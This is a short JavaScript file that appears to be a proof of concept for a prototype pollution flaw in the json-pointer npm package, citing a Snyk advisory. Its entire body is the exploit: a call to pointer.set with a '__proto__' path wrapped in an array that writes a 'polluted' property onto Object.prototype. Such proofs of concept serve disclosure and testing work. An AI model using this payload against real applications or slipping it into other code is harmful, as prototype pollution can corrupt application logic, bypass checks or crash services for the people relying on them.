//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
 
  const pointer = require("json-pointer");
  let obj = {};

   

  pointer.set({}, [["__proto__"], "polluted"], "yes");
// End of file
